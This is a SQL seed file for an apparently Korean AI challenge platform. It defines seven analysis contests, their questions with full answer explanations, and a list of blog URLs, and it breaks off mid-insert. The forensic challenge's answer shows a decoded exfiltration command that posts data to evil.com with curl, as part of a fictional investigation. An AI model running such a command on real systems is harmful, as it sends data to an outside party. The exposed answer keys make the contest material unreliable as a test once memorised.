-- =============================================================================
-- Seed Data (snake_case schema)
-- Database: PostgreSQL (Supabase, MySQL compatible)
-- =============================================================================

BEGIN;

-- Clear existing data
DELETE FROM answers;
DELETE FROM submission_sessions;
DELETE FROM answer_keys;
DELETE FROM dataset_urls;
DELETE FROM questions;
DELETE FROM challenges;

-- =============================================================================
-- Challenges
-- =============================================================================

INSERT INTO challenges (id, title, subtitle, summary, tags, badge, difficulty, description, caution_text, dataset_label, dataset_file_name, dataset_description, dataset_download_url, restrict_dataset_url, is_published)
VALUES
  ('pfct-news', 'PFCT Blog Insight', 'AI Challenge Hub',
   'PFCT 블로그 콘텐츠를 기반으로 카테고리·주제 인식과 근거 판별 능력을 확인하는 콘테스트.',
   '["리서치","콘텐츠 분석","분류"]', NULL, 2,
   'PFCT 블로그 데이터셋을 기반으로 카테고리와 주제를 정확히 구분하는 능력을 확인합니다. 제공된 URL 목록을 바탕으로 각 질문 항목에 맞는 근거를 선택하세요.',
   '모든 응답은 지정된 데이터셋 범위 안에서만 인정됩니다. 최종 제출 이후에는 수정이 불가합니다.',
   'PFCT 블로그 100건', 'pfct_blog_urls_100.txt', 'PFCT 블로그 게시글 URL 목록',
   NULL, false, true),

  ('pfct-ocr', '스마트 배달 배차 분석 챌린지', 'AI Challenge Hub',
   'AI 스마트 배차 엔진의 로그를 분석하여 규칙 준수 여부와 배차 효율을 검증하는 콘테스트.',
   '["운영 분석","로그 검증","배차 최적화"]', NULL, 1,
   '배달 플랫폼의 효율성을 높이기 위해 도입된 AI 스마트 배차 엔진 로그를 분석합니다. 제공된 라이더 정보와 배차 로그(CSV/JSON)를 바탕으로 규칙이 제대로 적용되었는지 판단하고, 주어진 질문에 답하세요.',
   '모든 계산은 제공된 데이터셋 기준으로만 수행합니다. 제시된 규칙 외의 가정을 추가하지 마세요.',
   '배차 로그 3종', 'delivery_data.zip', 'rider_info.json, dispatch_log.csv, pending_orders.csv',
   '/datasets/delivery_data.zip', false, true),

  ('drone-multimodal', '드론 AI 비상 상황 판단 챌린지', '멀티모달 분석',
   '자율주행 드론의 비행 로그와 카메라 이미지를 분석하여 AI의 비상 판단이 적절했는지 평가합니다.',
   '["멀티모달","센서 분석","AI 판단"]', NULL, 3,
   '자율주행 드론 관제 센터의 엔지니어로서, 비행 중 발생한 비상 상황(Event)을 분석해야 합니다. AI가 현장에서 수집한 멀티모달 데이터(시각 정보 + 센서 로그)를 상호 검증하여, AI의 판단이 적절했는지 평가해 주세요.',
   '센서 로그와 이미지를 함께 분석해야 정확한 판단이 가능합니다. drone_specs.json의 안전 규칙을 참고하세요.',
   '드론 비행 로그 및 이미지', 'drone_log_data.zip', '3개 이벤트의 센서 로그(JSON)와 현장 이미지(PNG), 드론 사양서 포함',
   '/datasets/drone_log_data.zip', false, true),

  ('voyager-signal', '보이저 3호 외계 신호 해독', '심우주 탐사',
   '심우주를 탐사 중인 보이저 3호가 수신한 정체불명의 신호를 해독하여 외계 문명의 메시지를 밝혀내세요.',
   '["신호 처리","패턴 인식","이진 해독"]', NULL, 3,
   '보이저 3호가 수신한 이진 신호에는 엄청난 노이즈 속에 의미 있는 메시지가 숨겨져 있습니다. 제공된 해독 규칙에 따라 노이즈를 제거하고, 8비트 ASCII 코드로 변환하여 외계 문명의 메시지를 해독하세요.',
   '신호는 8비트 단위로 처리합니다. 1010으로 시작하는 청크는 노이즈입니다. 헤더/푸터 패턴을 정확히 찾아야 합니다.',
   '신호 데이터 및 해독 규칙', 'voyager_signal.zip', 'signal_data.txt (이진 신호), decoding_rules.md (해독 규칙)',
   '/datasets/voyager_signal.zip', false, true),

  ('ott-analysis', 'OTT 콘텐츠 흥행 분석', '데이터 사이언스',
   '글로벌 OTT 플랫폼의 콘텐츠와 사용자 시청 기록을 분석하여 흥행 패턴을 파악하고 추천 알고리즘을 검증하세요.',
   '["통계 분석","추천 시스템","사용자 행동"]', NULL, 2,
   'OTT 플랫폼의 데이터 과학자가 되어 콘텐츠 메타데이터와 사용자 시청 로그를 분석합니다. 장르별 흥행도, VIP 유저 선호도, 추천 알고리즘 검증 등의 과제를 수행하세요.',
   '모든 분석은 제공된 데이터셋 범위 내에서만 수행합니다. 시청 시간의 단위는 분(minutes)입니다.',
   'OTT 콘텐츠 데이터', 'ott_data.zip', 'contents_meta.csv (콘텐츠 정보), user_logs.json (시청 기록)',
   '/datasets/ott_data.zip', false, true),

  ('warehouse-robot', '스마트 물류 로봇 동선 최적화', '알고리즘 시뮬레이션',
   '스마트 물류 센터의 AI 로봇들이 주문을 처리하는 최적 경로를 설계하고 시스템 병목을 분석하세요.',
   '["경로 탐색","작업 할당","시뮬레이션"]', NULL, 4,
   '최첨단 물류 센터에서 수십 대의 로봇이 물건을 나르고 있습니다. 창고 지도, 주문 목록, 로봇 상태를 분석하여 최적의 이동 경로와 작업 할당을 설계하세요.',
   '로봇은 상하좌우로만 이동 가능합니다. 맨해튼 거리를 기준으로 계산하세요. 배터리 20% 미만 로봇은 작업 불가합니다.',
   '물류 센터 시뮬레이션 데이터', 'warehouse_data.zip', 'warehouse_map.txt, orders.json, robot_status.csv, operation_rules.md',
   '/datasets/warehouse_data.zip', false, true),

  ('forensic-protocol-zero', 'Ghost in the Shell: Protocol Zero', '디지털 포렌식',
   '내부 횡령 사건의 디지털 흔적을 추적하여 진범을 밝혀내는 하드코어 포렌식 챌린지입니다.',
   '["포렌식","로그 분석","암호 해독","크로스 파일"]', NULL, 4,
   '당신은 대기업 보안팀의 디지털 포렌식 전문가입니다. 내부 횡령 사건이 발생했고, 해커는 VPN으로 IP를 세탁하고, 명령어를 난독화하며, 증거를 여러 파일에 분산시켰습니다. 웹 로그, 출입 기록, 터미널 히스토리, 직원 프로필, CCTV 영상을 교차 분석하여 진범을 찾아내세요.',
   '모든 증거는 제공된 데이터셋 내에 있습니다. 파일 간 상관관계 분석이 핵심입니다. Base64 디코딩, 이미지 반전(Mirror) 등 다양한 기법이 필요합니다.',
   '포렌식 데이터 5종', 'forensic_hardcore_data.zip', 'web_access_log.json, gate_entry_log.csv, terminal_history.txt, employee_profile.txt, cctv_snapshot.png',
   '/datasets/forensic_hardcore_data.zip', false, true);

-- =============================================================================
-- Questions
-- =============================================================================

-- pfct-news questions (크롤링 기반 문제, 총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('pfct-news-q1', 'pfct-news', 1, 'SHORT',
   '본문에 ''AI''라는 키워드가 포함된 블로그는 몇 개인가요?',
   NULL, true, 10,
   '**정답: 37개** - 100개 블로그를 크롤링하여 본문에서 "AI"(대문자) 포함 여부를 확인합니다.'),
  ('pfct-news-q2', 'pfct-news', 2, 'SHORT',
   '100개 블로그 본문에서 ''금리''라는 단어가 총 몇 회 등장하나요?',
   NULL, true, 20,
   '**정답: 384회** - 모든 블로그 본문에서 "금리" 문자열의 등장 횟수를 합산합니다.'),
  ('pfct-news-q3', 'pfct-news', 3, 'SHORT',
   '''투자''라는 단어가 가장 많이 등장하는 블로그의 slug는? (slug: URL에서 도메인을 제외한 경로)',
   NULL, true, 20,
   '**정답: 채권-투자의-매력** - 각 블로그별 "투자" 등장 횟수를 카운트하여 최대값 블로그의 slug를 추출합니다.'),
  ('pfct-news-q4', 'pfct-news', 4, 'SHORT',
   '본문에 ''담보''와 ''아파트'' 두 키워드가 모두 포함된 블로그는 몇 개인가요?',
   NULL, true, 20,
   '**정답: 11개** - 각 블로그에서 "담보"와 "아파트" 두 단어가 모두 존재하는지 AND 조건으로 필터링합니다.'),
  ('pfct-news-q5', 'pfct-news', 5, 'SHORT',
   '''AI''라는 단어가 가장 많이 등장하는 블로그의 slug는? (slug: URL에서 도메인을 제외한 경로, 예: blog.pfct.co.kr/hello → hello)',
   NULL, true, 30,
   '**정답: ai-lab** - 각 블로그별 "AI" 등장 횟수를 카운트하여 최대값 블로그의 slug를 추출합니다.');

-- pfct-ocr questions (총 90점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('pfct-ocr-q1', 'pfct-ocr', 1, 'single',
   'dispatch_log.csv 데이터 중, 선호 지역 가중치 적용으로 인해 실제 거리상 더 가까운 라이더가 있었음에도 배차권을 얻은 ''역전 배차'' 건수는 몇 건인가요?',
   '["2건","3건","4건","5건"]', true, 10,
   '**정답: 4건** - dispatch_log의 각 주문에 대해 모든 라이더의 raw_distance와 weighted_distance를 비교합니다. 선호 지역 가중치(0.8배)가 적용되면 실제 거리가 멀어도 가중 거리가 짧아져 배차받을 수 있습니다.'),
  ('pfct-ocr-q2', 'pfct-ocr', 2, 'single',
   '배차에 성공한 라이더들의 평균 실제 이동 거리(raw_distance)를 긴 순서에서 짧은 순서로 정렬한 것을 고르세요.',
   '["정스피드 > 박민수 > 이영희 > 김철수 > 최신속","정스피드 > 김철수 > 이영희 > 박민수 > 최신속","최신속 > 박민수 > 이영희 > 김철수 > 정스피드","이영희 > 정스피드 > 김철수 > 박민수 > 최신속"]',
   true, 15,
   '**정답: 정스피드 > 김철수 > 이영희 > 박민수 > 최신속** - 라이더별 평균: 정스피드 5.22km, 김철수 1.71km, 이영희/박민수/최신속 1.21km. 동점은 이름순 정렬.'),
  ('pfct-ocr-q3', 'pfct-ocr', 3, 'single',
   '배차 완료 데이터에서, 선호 지역 라이더가 배정된 비율이 100%인 지역 중 배정 건수가 가장 많은 지역은?',
   '["강남구","서초구","역삼동","송파구"]', true, 15,
   '**정답: 서초구** - 강남구 50%(2/4), 서초구 100%(3/3), 송파구 100%(2/2), 역삼동 100%(1/1). 100% 중 최다 배정은 서초구 3건.'),
  ('pfct-ocr-q4', 'pfct-ocr', 4, 'single',
   'pending_orders.csv 기준, 배차 실패 원인 중 가장 많이 발생한 사유는 무엇인가요?',
   '["배달 가능 반경(10km) 초과","라이더의 최대 적재 용량 초과","가용 라이더의 업무 부하(2건) 초과","주문 지역 선호 라이더 부재"]',
   true, 10,
   '**정답: 라이더의 최대 적재 용량 초과** - CAPACITY_EXCEEDED 3건, RIDER_FULL 2건, OUT_OF_RANGE 1건.'),
  ('pfct-ocr-q5', 'pfct-ocr', 5, 'single',
   '모든 배차 완료 후, 남은 적재 용량이 큰 순서대로 라이더를 정렬한 결과는 무엇인가요?',
   '["정스피드 > 김철수 > 최신속 > 이영희 = 박민수","정스피드 > 이영희 > 박민수 > 김철수 > 최신속","김철수 > 정스피드 > 최신속 > 이영희 = 박민수","최신속 > 이영희 > 박민수 > 정스피드 > 김철수"]',
   true, 40,
   '**정답: 정스피드 > 김철수 > 최신속 > 이영희 = 박민수** - 정스피드 10, 김철수 2, 최신속 1, 이영희/박민수 0.');

-- drone-multimodal questions (총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('drone-q1', 'drone-multimodal', 1, 'SINGLE',
   '14:22:05 주택가 골목 비행 중 발생한 EMERGENCY_STOP 이벤트입니다. event_001_sensor.json과 event_001_vision.png를 대조하여 AI의 판단 근거를 분석하세요.',
   '["과잉 반응: 장애물이 작아 회피 가능했음","적절한 판단: 생명체 식별 및 안전거리 미확보로 정지함","센서 오류: 이미지와 라이다 거리값 불일치","판단 불가: 조도 부족으로 식별 불가"]',
   true, 30,
   '**정답: 적절한 판단** - lidar_front 1.8m가 안전거리 2.0m 미만이고, object_detected가 true입니다. 이미지에서도 장애물이 확인되어 긴급정지는 적절합니다.'),
  ('drone-q2', 'drone-multimodal', 2, 'SINGLE',
   '목적지 상공(Target_Zone_7B)에 도착했으나 착륙하지 않고 회항했습니다. event_002_sensor.json과 event_002_vision.png를 분석하여 AI가 착륙을 포기한 기술적 원인은 무엇입니까?',
   '["GPS 신호 미약으로 위치 특정 실패","고도 센서 오작동 (지상으로 오인)","표면 스캔 결과 불안정(UNSTABLE) - 장애물 감지","배터리 잔량 부족 (Critical Low)"]',
   true, 30,
   '**정답: 표면 스캔 결과 불안정(UNSTABLE)** - surface_scan.status가 UNSTABLE이고 flatness_score 0.3이 기준 0.8 미만입니다. GPS, 배터리는 정상.'),
  ('drone-q3', 'drone-multimodal', 3, 'SINGLE',
   '맑은 날씨(Clear)임에도 VISUAL_ERROR 경고가 발생했습니다. event_003_sensor.json과 event_003_vision.png를 분석하여 엔지니어로서 가장 먼저 수행해야 할 조치는 무엇입니까?',
   '["기상청 API 서버 점검 요청","즉시 복귀 명령 (시각 센서 신뢰도 저하)","강제 착륙 시도 (현 위치)","API 데이터 신뢰 후 계속 비행"]',
   true, 40,
   '**정답: 즉시 복귀 명령** - visual_confidence 0.12가 기준 0.6 미만이고, lens_status가 OBSTRUCTED입니다. API와 센서 불일치 시 안전을 위해 즉시 복귀.');

-- voyager-signal questions (외계 신호 해독, 총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('voyager-q1', 'voyager-signal', 1, 'SHORT',
   '제공된 규칙에 따라 신호에서 노이즈를 제거했을 때, 전체 신호 대비 노이즈의 비율은 얼마인가요? (소수점 둘째 자리까지, 예: 12.34)',
   NULL, true, 30,
   '**정답: 39.60%** - 전체 1616비트를 8비트 청크(202개)로 분할 후, 1010 시작 청크(80개)가 노이즈. 80/202 × 100 = 39.60%.'),
  ('voyager-q2', 'voyager-signal', 2, 'SHORT',
   '해독된 메시지에서 "HELLO_EARTH"라는 문자열이 총 몇 번 등장하나요?',
   NULL, true, 30,
   '**정답: 3회** - 해독 결과: "HELLO_EARTH THIS_IS_VOYAGER_3 COORDINATES X:127 Y:891 Z:2049 HELLO_EARTH WE_COME_IN_PEACE HELLO_EARTH END_TRANSMISSION"'),
  ('voyager-q3', 'voyager-signal', 3, 'SINGLE',
   '해독된 메시지에 포함된 좌표 정보(X, Y, Z)를 고르세요.',
   '["X:127 Y:891 Z:2049","X:256 Y:512 Z:1024","X:100 Y:200 Z:300","X:891 Y:127 Z:2049"]',
   true, 40,
   '**정답: X:127 Y:891 Z:2049** - 해독 메시지에서 "COORDINATES X:127 Y:891 Z:2049" 패턴을 추출합니다.');

-- ott-analysis questions (OTT 콘텐츠 분석, 총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('ott-q1', 'ott-analysis', 1, 'SINGLE',
   '지난 1년간 공개된 콘텐츠 중 평균 시청 시간이 가장 긴 장르 TOP 3를 순서대로 나열한 것을 고르세요.',
   '["SF > 스릴러 > 액션","드라마 > 로맨스 > 코미디","액션 > SF > 스릴러","스릴러 > 액션 > SF"]',
   true, 30,
   '**정답: SF > 스릴러 > 액션** - SF 94.69분, 스릴러 87.24분, 액션 81.22분, 드라마 76.40분 순.'),
  ('ott-q2', 'ott-analysis', 2, 'SHORT',
   '가장 많은 콘텐츠를 시청한 상위 1% VIP 유저들이 공통적으로 가장 많이 시청한 배우는 누구인가요? (예: 배우A)',
   NULL, true, 30,
   '**정답: 배우C** - 200명 중 상위 1%(2명: U0001 60건, U0002 56건)의 배우별 시청: 배우C 43회, 배우A 14회, 배우F 12회.'),
  ('ott-q3', 'ott-analysis', 3, 'SHORT',
   'SF 장르 콘텐츠의 평균 시청 시간은 몇 분인가요? (소수점 첫째 자리까지, 예: 94.7)',
   NULL, true, 40,
   '**정답: 94.7분** - SF 장르 시청 로그 415건의 평균 시청 시간: 94.69분 ≈ 94.7분.');

-- warehouse-robot questions (물류 로봇 최적화, 총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('warehouse-q1', 'warehouse-robot', 1, 'SHORT',
   '로봇 R01이 (1,1) 위치에서 주문 ORD003의 픽업 위치 (6,6)까지 이동할 때 맨해튼 거리는 얼마인가요?',
   NULL, true, 30,
   '**정답: 10** - 맨해튼 거리: |6-1| + |6-1| = 5 + 5 = 10'),
  ('warehouse-q2', 'warehouse-robot', 2, 'SINGLE',
   '현재 대기 중인 주문들을 가용 로봇들에게 할당할 때, 전체 로봇의 예상 총 이동 거리가 가장 짧아지는 최적 할당의 총 거리는?',
   '["10","12","14","16"]',
   true, 30,
   '**정답: 12** - 최적 할당: R01→ORD001(2), R02→ORD005(3), R03→ORD004(3), R04→ORD003(4). 총 2+3+3+4=12'),
  ('warehouse-q3', 'warehouse-robot', 3, 'SHORT',
   '시뮬레이션 결과, 모든 로봇이 작업을 수행할 때 가장 많이 통과하여 혼잡도가 높을 것으로 예상되는 좌표는? (예: 4,4)',
   NULL, true, 40,
   '**정답: 4,4** - 창고 중앙(4,4)은 모든 로봇이 각자의 목적지로 이동할 때 공통으로 통과하는 병목 지점입니다.');

-- forensic-protocol-zero questions (하드코어 포렌식, 총 100점)
INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('forensic-q1', 'forensic-protocol-zero', 1, 'SHORT',
   'web_access_log.json을 보면 해커는 VPN을 사용하여 IP를 지속적으로 세탁했습니다. 하지만 특정 요청의 HTTP Header에 실수로 실제 IP(Origin IP)가 노출된 흔적이 딱 하나 남아 있습니다. X-Forwarded-For 또는 Client-IP 헤더를 전수 조사하여 해커의 진짜 IP를 찾아내세요. (예: 192.168.1.1)',
   NULL, true, 20,
   '**정답: 203.0.113.42** - web_access_log.json에서 12:55:00Z의 POST /admin/transfer 요청에 X-Forwarded-For: 203.0.113.42 헤더가 있습니다. 이것이 VPN 뒤에 숨겨진 실제 IP입니다.'),
  ('forensic-q2', 'forensic-protocol-zero', 2, 'SHORT',
   '해커의 실제 IP(GeoIP 조회 결과: 부산)와 gate_entry_log.csv의 DEV_KIM 출입 기록(서울 본사, 12:30)을 대조하세요. 부산에서의 접속 시간(12:55)과의 시간차는 단 25분입니다. 이 이동이 물리적으로 불가능함을 증명하기 위해, 두 지점 사이의 최소 이동 속도(km/h)를 계산하여 정수 단위로 제출하세요. (직선거리 325km 가정)',
   NULL, true, 20,
   '**정답: 780** - 속도 = 거리 / 시간 = 325km / (25/60)h = 325 × 60 / 25 = 780km/h. KTX 최고속도(305km/h)의 2.5배, 물리적으로 불가능합니다.'),
  ('forensic-q3', 'forensic-protocol-zero', 3, 'SHORT',
   'terminal_history.txt를 보면 해커는 Base64 인코딩된 명령어를 eval로 실행했습니다. 난독화된 명령어를 복호화하여, 해커가 데이터를 외부로 빼돌리기 위해 사용한 도구(Tool) 이름만 입력하세요. (예: wget)',
   NULL, true, 20,
   '**정답: curl** - Base64 디코딩: echo "Y3Vyb..." | base64 -d → "curl -X POST http://evil.com/steal_data --data ''all_your_base''"'),
  ('forensic-q4', 'forensic-protocol-zero', 4, 'SHORT',
   '해커는 탈취한 자금의 지갑 주소를 3개 파일에 쪼개서 은닉했습니다. (1) web_access_log.json의 404 에러 URL 파라미터를 Base64 디코딩, (2) terminal_history.txt의 주석(#) 부분, (3) employee_profile.txt 끝에 숨겨진 텍스트를 조합하여 완전한 지갑 주소를 복원하세요.',
   NULL, true, 20,
   '**정답: 0x3f_Start_Middle_777_End_Code_X** - Part1: Base64(SGVhZGVy...)→"0x3f_Start_", Part2: # Key_Part2: Middle_777_, Part3: # Hidden_Key_Part3: End_Code_X'),
  ('forensic-q5', 'forensic-protocol-zero', 5, 'SINGLE',
   'cctv_snapshot.png는 서버실 유리벽에 비친 반사상입니다. 이미지 속 인물이 마우스를 쥔 손은 거울에 반전되어 보입니다. 이를 고려하여 employee_profile.txt와 대조한 뒤, 진범을 지목하세요.',
   '["DEV_KIM (왼손잡이)","SEC_PARK (오른손잡이)"]',
   true, 20,
   '**정답: SEC_PARK** - IP 203.0.113.42는 부산 지사(SEC_PARK IP 대역)입니다. 또한 CCTV가 거울상이므로, 이미지에서 왼손처럼 보이면 실제는 오른손 → SEC_PARK(오른손잡이)입니다.');

-- =============================================================================
-- Dataset URLs (pfct-news)
-- =============================================================================

INSERT INTO dataset_urls (id, challenge_id, url) VALUES
  ('pfct-news-url-001', 'pfct-news', 'https://blog.pfct.co.kr/%ea%b3%a0%ea%b0%9d-%ea%b0%90%ec%82%ac-%ec%9d%b4%eb%b2%a4%ed%8a%b8'),
  ('pfct-news-url-002', 'pfct-news', 'https://blog.pfct.co.kr/%eb%8c%80%ec%b6%9c%eb%b9%99%ec%9e%90%ed%98%95-%eb%b3%b4%ec%9d%b4%ec%8a%a4%ed%94%bc%ec%8b%b1-%ec%a3%bc%ec%9d%98%eb%b3%b4-%ec%82%ac%eb%a1%80%ec%99%80-%ec%98%88%eb%b0%a9%eb%b2%95%ec%9d%80'),
  ('pfct-news-url-003', 'pfct-news', 'https://blog.pfct.co.kr/%eb%a7%a4%ec%9e%85%ed%99%95%ec%95%bd'),
  ('pfct-news-url-004', 'pfct-news', 'https://blog.pfct.co.kr/%eb%b6%84%ec%82%b0-%ed%88%ac%ec%9e%90'),
  ('pfct-news-url-005', 'pfct-news', 'https://blog.pfct.co.kr/%ec%86%8c%ec%95%a1-%ed%88%ac%ec%9e%90'),
  ('pfct-news-url-006', 'pfct-news', 'https://blog.pfct.co.kr/%ec%8b%a0%ec%9a%a9%ec%a0%90%ec%88%98-%ec%98%ac%eb%a6%ac%eb%8a%94-%ed%98%84%eb%aa%85%ed%95%9c-%eb%8c%80%ec%b6%9c-%ec%83%81%ed%99%98-%ec%88%9c%ec%84%9c'),
  ('pfct-news-url-007', 'pfct-news', 'https://blog.pfct.co.kr/%ec%97%b0%ec%b2%b4%ec%9c%a8-vs-%ec%86%90%ec%8b%a4%eb%a5%a0'),
  ('pfct-news-url-008', 'pfct-news', 'https://blog.pfct.co.kr/%ec%9c%a0%ed%9a%a8%eb%8b%b4%eb%b3%b4%eb%b9%84%ec%9c%a8'),
  ('pfct-news-url-009', 'pfct-news', 'https://blog.pfct.co.kr/%ec%9d%b4%ec%bb%a4%eb%a8%b8%ec%8a%a4-%ec%a0%95%ec%82%b0-%ec%a7%80%ec%97%b0-%ec%82%ac%ed%83%9c'),
  ('pfct-news-url-010', 'pfct-news', 'https://blog.pfct.co.kr/%ec%b1%84%ea%b6%8c-%ed%88%ac%ec%9e%90%ec%9d%98-%eb%a7%a4%eb%a0%a5'),
  ('pfct-news-url-011', 'pfct-news', 'https://blog.pfct.co.kr/%ed%81%ac%ed%94%8c-%eb%8c%80%ec%b6%9c-%ec%8b%a0%ec%9a%a9%ec%a0%90%ec%88%98'),
  ('pfct-news-url-012', 'pfct-news', 'https://blog.pfct.co.kr/%ed%99%a9%ea%b8%88-%ed%8f%ac%ed%8a%b8%ed%8f%b4%eb%a6%ac%ec%98%a4'),
  ('pfct-news-url-013', 'pfct-news', 'https://blog.pfct.co.kr/13%ec%9b%94%ec%9d%98-%ec%9b%94%ea%b8%89'),
  ('pfct-news-url-014', 'pfct-news', 'https://blog.pfct.co.kr/2019-yearend-workshop'),
  ('pfct-news-url-015', 'pfct-news', 'https://blog.pfct.co.kr/2020-yearend-workshop'),
  ('pfct-news-url-016', 'pfct-news', 'https://blog.pfct.co.kr/2020_reddot_award'),
  ('pfct-news-url-017', 'pfct-news', 'https://blog.pfct.co.kr/2021-njt'),
  ('pfct-news-url-018', 'pfct-news', 'https://blog.pfct.co.kr/2024-year-end-party'),
  ('pfct-news-url-019', 'pfct-news', 'https://blog.pfct.co.kr/2024_infographic'),
  ('pfct-news-url-020', 'pfct-news', 'https://blog.pfct.co.kr/2025-pipcnic'),
  ('pfct-news-url-021', 'pfct-news', 'https://blog.pfct.co.kr/20percent'),
  ('pfct-news-url-022', 'pfct-news', 'https://blog.pfct.co.kr/4-ways-to-use-loan-to-loan'),
  ('pfct-news-url-023', 'pfct-news', 'https://blog.pfct.co.kr/6things-to-consider-before-you-receive-a-credit-loan'),
  ('pfct-news-url-024', 'pfct-news', 'https://blog.pfct.co.kr/about_us_peoplefund'),
  ('pfct-news-url-025', 'pfct-news', 'https://blog.pfct.co.kr/agos-informs'),
  ('pfct-news-url-026', 'pfct-news', 'https://blog.pfct.co.kr/ai-lab'),
  ('pfct-news-url-027', 'pfct-news', 'https://blog.pfct.co.kr/ai-technology'),
  ('pfct-news-url-028', 'pfct-news', 'https://blog.pfct.co.kr/airpack-branding'),
  ('pfct-news-url-029', 'pfct-news', 'https://blog.pfct.co.kr/airpack_gameday'),
  ('pfct-news-url-030', 'pfct-news', 'https://blog.pfct.co.kr/aju_ceo_opinion'),
  ('pfct-news-url-031', 'pfct-news', 'https://blog.pfct.co.kr/all-about-peoplefund-investment-in-apartment-mortgage'),
  ('pfct-news-url-032', 'pfct-news', 'https://blog.pfct.co.kr/alternative-card-loan'),
  ('pfct-news-url-033', 'pfct-news', 'https://blog.pfct.co.kr/alternative-loan'),
  ('pfct-news-url-034', 'pfct-news', 'https://blog.pfct.co.kr/apart_rate-of-return'),
  ('pfct-news-url-035', 'pfct-news', 'https://blog.pfct.co.kr/apt'),
  ('pfct-news-url-036', 'pfct-news', 'https://blog.pfct.co.kr/apt-npl'),
  ('pfct-news-url-037', 'pfct-news', 'https://blog.pfct.co.kr/asia_ceo'),
  ('pfct-news-url-038', 'pfct-news', 'https://blog.pfct.co.kr/awesome-keyboard'),
  ('pfct-news-url-039', 'pfct-news', 'https://blog.pfct.co.kr/aws-reinvent-2023'),
  ('pfct-news-url-040', 'pfct-news', 'https://blog.pfct.co.kr/aws_summit'),
  ('pfct-news-url-041', 'pfct-news', 'https://blog.pfct.co.kr/b2b-solution-airpack'),
  ('pfct-news-url-042', 'pfct-news', 'https://blog.pfct.co.kr/backend-engineer-sj'),
  ('pfct-news-url-043', 'pfct-news', 'https://blog.pfct.co.kr/badminton'),
  ('pfct-news-url-044', 'pfct-news', 'https://blog.pfct.co.kr/byungkyu'),
  ('pfct-news-url-045', 'pfct-news', 'https://blog.pfct.co.kr/ceo-column'),
  ('pfct-news-url-046', 'pfct-news', 'https://blog.pfct.co.kr/cio_sungyeol'),
  ('pfct-news-url-047', 'pfct-news', 'https://blog.pfct.co.kr/clo-compliance'),
  ('pfct-news-url-048', 'pfct-news', 'https://blog.pfct.co.kr/column_clo'),
  ('pfct-news-url-049', 'pfct-news', 'https://blog.pfct.co.kr/contribution-210419'),
  ('pfct-news-url-050', 'pfct-news', 'https://blog.pfct.co.kr/contribution-210802'),
  ('pfct-news-url-051', 'pfct-news', 'https://blog.pfct.co.kr/contribution-220404'),
  ('pfct-news-url-052', 'pfct-news', 'https://blog.pfct.co.kr/core_service'),
  ('pfct-news-url-053', 'pfct-news', 'https://blog.pfct.co.kr/corebanking'),
  ('pfct-news-url-054', 'pfct-news', 'https://blog.pfct.co.kr/cple'),
  ('pfct-news-url-055', 'pfct-news', 'https://blog.pfct.co.kr/cple_benefit'),
  ('pfct-news-url-056', 'pfct-news', 'https://blog.pfct.co.kr/cple_investment'),
  ('pfct-news-url-057', 'pfct-news', 'https://blog.pfct.co.kr/cple_loan'),
  ('pfct-news-url-058', 'pfct-news', 'https://blog.pfct.co.kr/cple_mortgageloan'),
  ('pfct-news-url-059', 'pfct-news', 'https://blog.pfct.co.kr/cple_personal-loan'),
  ('pfct-news-url-060', 'pfct-news', 'https://blog.pfct.co.kr/cplenews'),
  ('pfct-news-url-061', 'pfct-news', 'https://blog.pfct.co.kr/credit'),
  ('pfct-news-url-062', 'pfct-news', 'https://blog.pfct.co.kr/credit-card-installment-and-revolving'),
  ('pfct-news-url-063', 'pfct-news', 'https://blog.pfct.co.kr/credit-line'),
  ('pfct-news-url-064', 'pfct-news', 'https://blog.pfct.co.kr/credit-mid-class'),
  ('pfct-news-url-065', 'pfct-news', 'https://blog.pfct.co.kr/css-academy-1'),
  ('pfct-news-url-066', 'pfct-news', 'https://blog.pfct.co.kr/css-academy-2'),
  ('pfct-news-url-067', 'pfct-news', 'https://blog.pfct.co.kr/cultureland'),
  ('pfct-news-url-068', 'pfct-news', 'https://blog.pfct.co.kr/cultureland-2'),
  ('pfct-news-url-069', 'pfct-news', 'https://blog.pfct.co.kr/current_investment'),
  ('pfct-news-url-070', 'pfct-news', 'https://blog.pfct.co.kr/dag_ai-bot'),
  ('pfct-news-url-071', 'pfct-news', 'https://blog.pfct.co.kr/data-analyst'),
  ('pfct-news-url-072', 'pfct-news', 'https://blog.pfct.co.kr/data_strategy_team'),
  ('pfct-news-url-073', 'pfct-news', 'https://blog.pfct.co.kr/depression-p2p'),
  ('pfct-news-url-074', 'pfct-news', 'https://blog.pfct.co.kr/design-system'),
  ('pfct-news-url-075', 'pfct-news', 'https://blog.pfct.co.kr/difference-of-marketplace-lending'),
  ('pfct-news-url-076', 'pfct-news', 'https://blog.pfct.co.kr/diversified-investment-magic'),
  ('pfct-news-url-077', 'pfct-news', 'https://blog.pfct.co.kr/dj_kdd_2024'),
  ('pfct-news-url-078', 'pfct-news', 'https://blog.pfct.co.kr/dmh_interview'),
  ('pfct-news-url-079', 'pfct-news', 'https://blog.pfct.co.kr/droidknights2025'),
  ('pfct-news-url-080', 'pfct-news', 'https://blog.pfct.co.kr/et-ceo-opinion'),
  ('pfct-news-url-081', 'pfct-news', 'https://blog.pfct.co.kr/etoday_ceo'),
  ('pfct-news-url-082', 'pfct-news', 'https://blog.pfct.co.kr/flexing-year-end'),
  ('pfct-news-url-083', 'pfct-news', 'https://blog.pfct.co.kr/fn_ceo_opinion'),
  ('pfct-news-url-084', 'pfct-news', 'https://blog.pfct.co.kr/former-cto'),
  ('pfct-news-url-085', 'pfct-news', 'https://blog.pfct.co.kr/ggang'),
  ('pfct-news-url-086', 'pfct-news', 'https://blog.pfct.co.kr/good-time-with-good-people-1'),
  ('pfct-news-url-087', 'pfct-news', 'https://blog.pfct.co.kr/good-time-with-good-people-2'),
  ('pfct-news-url-088', 'pfct-news', 'https://blog.pfct.co.kr/google-at-peoplefund'),
  ('pfct-news-url-089', 'pfct-news', 'https://blog.pfct.co.kr/happyhour'),
  ('pfct-news-url-090', 'pfct-news', 'https://blog.pfct.co.kr/hello-peopler'),
